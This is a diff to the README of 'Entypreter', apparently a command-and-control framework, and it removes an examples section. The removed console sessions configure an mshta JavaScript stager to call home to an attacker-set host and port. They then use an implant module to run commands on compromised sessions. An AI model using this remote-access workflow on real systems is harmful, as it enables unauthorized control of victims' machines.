@@ -42,49 +42,6 @@
 
 ***
 
-# The entypreter examples
-
-    INFO: There are some Entypreter examples - 
-    how to start Entypreter stager or implant.
-
-## Using entypreter stager
-
-> entypreter
-
-    (entypreter: sta/js/mshta)# info
-     
-            NAME       VALUE               REQ     DESCRIPTION     
-            -----      ------------        ----    -------------   
-            SRVHOST                        yes     Where the stager should call home.
-            SRVPORT                        yes     The port to listen for stagers on.
-            EXPIRES                        no      MM/DD/YYYY to stop calling home.
-            KEYPATH                        no      Private key for TLS communications.
-            CERTPATH                       no      Certificate for TLS communications.
-            MODULE                         no      Module to run once session is staged.
-        
-    (entypreter: sta/js/mshta)# set SRVHOST <lhost>
-    (entypreter: sta/js/mshta)# set SRVPORT <lport>
-    (entypreter: sta/js/mshta)# run
-    
-## Using entypreter implant
-
-> entypreter
-
-    (entypreter: sta/js/mshta)# use implant/manage/exec_cmd
-    (entypreter: imp/man/exec_cmd)# info
-     
-            NAME        VALUE               REQ     DESCRIPTION     
-            -----       ------------        ----    -------------   
-            CMD                             yes     Command to run. 
-            OUTPUT      true                yes     Retrieve output?
-            DIRECTORY   %TEMP%              no      Writeable directory for output.
-            SESSION     ALL                 yes     The session to target.
- 
-    (entypreter: imp/man/exec_cmd)# set CMD ipconfig
-    (entypreter: imp/man/exec_cmd)# run
-    
-***
-
 # Stagers and implants
 
     INFO: Entypreter stagers hook 
